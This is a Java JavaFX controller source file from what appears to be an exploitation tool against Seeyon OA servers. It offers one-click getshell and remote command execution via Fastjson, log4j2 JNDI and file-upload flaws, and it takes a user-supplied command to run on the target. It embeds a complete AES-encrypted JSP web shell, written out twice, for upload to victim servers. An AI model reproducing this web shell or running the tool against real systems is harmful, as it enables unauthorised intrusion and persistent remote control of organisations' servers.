package com.akkacloud.gui;

import com.akkacloud.utils.DnslogDomain;
import com.akkacloud.utils.PrintThread;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Modality;
import javafx.stage.Stage;

import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static com.akkacloud.core.SeeyonOACheck.*;
import static com.akkacloud.core.SeeyonOACheck.SeeyonOA_Fastjson_SursenServlet_Rce_Check;

public class OAController {

    @FXML
    //private ChoiceBox<String> VulList;
    private ComboBox<String> VulList;

    @FXML
    private TextField VulAdr;

    @FXML
    private Button checkVul;

    @FXML
    private Tab info;

    @FXML
    public TextArea infoText;

    @FXML
    private Tab cmdEx;

    @FXML
    private TextArea cmdExText;


    @FXML
    private MenuItem proxyBtn;

    @FXML
    private TextField JndiAdr;

    @FXML
    private TextField JndiCmd;

    @FXML
    private Button JndiBtn;

    @FXML
    private TextArea JndiResultInfo;

    @FXML
    private Button ClrJndiInfoBtn;

    @FXML
    private ComboBox<String> Encode;

    @FXML
    void ClrJndiInfoction(ActionEvent event) {
        JndiResultInfo.clear();
    }

    @FXML
    void FastJsonExec(ActionEvent event) {
        String jndiAdrText = JndiAdr.getText();
        String jndiCmdText = JndiCmd.getText();
        String vulAdrText = VulAdr.getText();
        String encodeValue = Encode.getValue();
        String value = VulList.getValue();
        try {
            if(value=="SeeyonOA_Fastjson_SursenServlet_Rce"){
                StringBuilder stringBuilder = SeeyonOA_Fastjson_SursenServlet_Rce(vulAdrText, jndiAdrText, jndiCmdText,encodeValue);
                JndiResultInfo.appendText(stringBuilder.toString());
            }else if(value=="SeeyonOA_Fastjson_ChangeLocale_Rce"){
                StringBuilder stringBuilder = SeeyonOA_Fastjson_ChangeLocale_Rce(vulAdrText, jndiAdrText, jndiCmdText, encodeValue);
                JndiResultInfo.appendText(stringBuilder.toString());
            }else if (value=="SeeyonOA_log4j2_RCE"){
                StringBuilder stringBuilder = SeeyonOA_log4j2_RCE(vulAdrText, jndiAdrText, jndiCmdText, encodeValue);
                JndiResultInfo.appendText(stringBuilder.toString());
            } else {
                JndiResultInfo.appendText("[-]请选择对应的JNDI漏洞利用\r\n");
            }

        } catch (Exception e) {
            System.out.println("jndi执行错误");
            e.printStackTrace();
        }
    }

    @FXML
    void checkVul(ActionEvent event){
        Thread thread = new Thread(()->{
            try {
                String value = VulList.getValue();
                /*获取所有的漏洞*/
                String httpurl = VulAdr.getText();

                Platform.runLater(()->{
                    infoText.setText("[+]漏洞是:"+value+"\r\n"+ "[+]地址是:"+httpurl+"\r\n");
                });

                if(value=="All"){
                    ObservableList<String> items = VulList.getItems();
                    for (String item : items) {
                        if(item=="SeeyonOA_Session_Divulge_Upload_Getshell"){
                            String uploadFile = "./test.zip";   //压缩包绝对路径的文件名
                            String shellContent = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\"><jsp:declaration> String xc=\"3c6e0b8a9c15224a\"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }}\n" +
                                    "</jsp:declaration><jsp:scriptlet>try{byte[] data=new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\", data);Object f=((Class)session.getAttribute(\"payload\")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}\n" +
                                    "</jsp:scriptlet></jsp:root>"; //需要写入的数据

                            StringBuilder vulInfo = Session_Divulge_Upload_VULcheck(httpurl, uploadFile, shellContent);
                            Platform.runLater(()->{
                                infoText.appendText(vulInfo.toString());
                            });

                        }
                        if(item=="SeeyonOA_ajaxAction_Upload_GetShell"){
                            StringBuilder vulInfo = SeeyonOA_ajaxAction_Upload_GetShell(httpurl);
                            Platform.runLater(()->{
                                infoText.appendText(vulInfo.toString());
                            });

                        }
                        /*改成dnslog认证*/
                        if(item=="SeeyonOA_Fastjson_SursenServlet_Rce"){
                            /*改成dnslog认证*/
                            StringBuilder vulInfo = SeeyonOA_Fastjson_SursenServlet_Rce_Check(httpurl);
                            Platform.runLater(()->{
                                infoText.appendText(vulInfo.toString());
                            });
                        }
                        if(item=="SeeyonOA_Fastjson_ChangeLocale_Rce"){
                            /*改成dnslog认证*/
                            StringBuilder vulInfo = SeeyonOA_Fastjson_ChangeLocale_Rce_Check(httpurl);
                            Platform.runLater(()->{
                                infoText.appendText(vulInfo.toString());
                            });
                        }

                        if(item=="SeeyonOA_Htmlofficeservlet_Rce"){
                            StringBuilder vulInfo = SeeyonOA_Htmlofficeservlet_Rce(httpurl);
                            Platform.runLater(()->{
                                infoText.appendText(vulInfo.toString());
                            });
                        }
                        if(value=="SeeyonOA_log4j2_RCE"){
                            StringBuilder vulInfo = SeeyonOA_log4j2_RCE_Check(httpurl);
                            Platform.runLater(()->{
                                infoText.appendText(vulInfo.toString());
                            });
                        }
                    }
                }else if(value=="SeeyonOA_Session_Divulge_Upload_Getshell"){
                    String uploadFile = "./test.zip";   //压缩包绝对路径的文件名
                    String shellContent = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\"><jsp:declaration> String xc=\"3c6e0b8a9c15224a\"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }}\n" +
                            "</jsp:declaration><jsp:scriptlet>try{byte[] data=new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\", data);Object f=((Class)session.getAttribute(\"payload\")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}\n" +
                            "</jsp:scriptlet></jsp:root>"; //需要写入的数据
                    StringBuilder vulInfo = Session_Divulge_Upload_VULcheck(httpurl, uploadFile, shellContent);

                    Platform.runLater(()->{
                        infoText.appendText(vulInfo.toString());
                    });
                }else if(value=="SeeyonOA_ajaxAction_Upload_GetShell"){

                    StringBuilder vulInfo =  SeeyonOA_ajaxAction_Upload_GetShell(httpurl);
                    Platform.runLater(()->{
                        infoText.appendText(vulInfo.toString());
                    });

                }else if(value=="SeeyonOA_Fastjson_SursenServlet_Rce"){
                    /*改成dnslog认证*/
                    StringBuilder vulInfo = SeeyonOA_Fastjson_SursenServlet_Rce_Check(httpurl);

                    Platform.runLater(()->{
                        infoText.appendText(vulInfo.toString());
                    });
                }else if(value=="SeeyonOA_Fastjson_ChangeLocale_Rce"){
                    /*改成dnslog认证*/
                    StringBuilder vulInfo = SeeyonOA_Fastjson_ChangeLocale_Rce_Check(httpurl);
                    Platform.runLater(()->{
                        infoText.appendText(vulInfo.toString());
                    });

                }else if(value=="SeeyonOA_Htmlofficeservlet_Rce") {
                    StringBuilder vulInfo = SeeyonOA_Htmlofficeservlet_Rce(httpurl);
                    Platform.runLater(() -> {
                        infoText.appendText(vulInfo.toString());
                    });
                }else if(value=="SeeyonOA_log4j2_RCE"){
                    StringBuilder vulInfo = SeeyonOA_log4j2_RCE_Check(httpurl);
                    Platform.runLater(()->{
                        infoText.appendText(vulInfo.toString());
                    });
                }else {
                    Platform.runLater(()->{
                        infoText.appendText("请正确输入漏洞编号");
                    });
                }

            } catch (Exception e) {
                e.printStackTrace();
            }

        });
        thread.start();

    }

    @FXML
    private TextField proxyIP;

    @FXML
    private TextField proxyPort;

    public static Map<String,String> Proxy  = new HashMap<String,String>();

    @FXML
    void proxyAction(ActionEvent event) {
        try {
            // 获取新窗口的fxml文件
            URL location = getClass().getResource("proxy.fxml");
            FXMLLoader fxmlLoader = new FXMLLoader();
            fxmlLoader.setLocation(location);
            AnchorPane settings = fxmlLoader.load();

            Stage settingsStage = new Stage();
            settingsStage.initModality(Modality.APPLICATION_MODAL);
            settingsStage.setTitle("代理设置");
            settingsStage.setScene(new Scene(settings));

/*            // 执行初始化操作
            OAController controller = fxmlLoader.getController();
            // Controller中的Init方法
            controller.init();*/

            settingsStage.show();

        } catch (Exception e){
            e.printStackTrace();
        }
    }

    /*初始化界面*/
    public void initialize(){
        initProxy();
        initComBoBox();
        initEncoding();
    }
    public void initProxy(){
        Proxy.put("Status","openProxy");
        Proxy.put("IP","127.0.0.1");
        Proxy.put("Port","8080");
    }
    public void initComBoBox() {
        ObservableList<String> seeyonVuls = FXCollections.observableArrayList(new String[]{"All","SeeyonOA_Session_Divulge_Upload_Getshell", "SeeyonOA_ajaxAction_Upload_GetShell", "SeeyonOA_Fastjson_SursenServlet_Rce","SeeyonOA_Fastjson_ChangeLocale_Rce","SeeyonOA_Htmlofficeservlet_Rce","SeeyonOA_log4j2_RCE"});
        VulList.setPromptText("All");
        VulList.setValue("All");
        VulList.setItems(seeyonVuls);
    }
    public void initEncoding(){
        ObservableList<String> Encodings = FXCollections.observableArrayList(new String[]{"UTF-8", "GBK"});
        Encode.setPromptText("UTF-8");
        Encode.setValue("UTF-8");
        Encode.setItems(Encodings);
    }



}
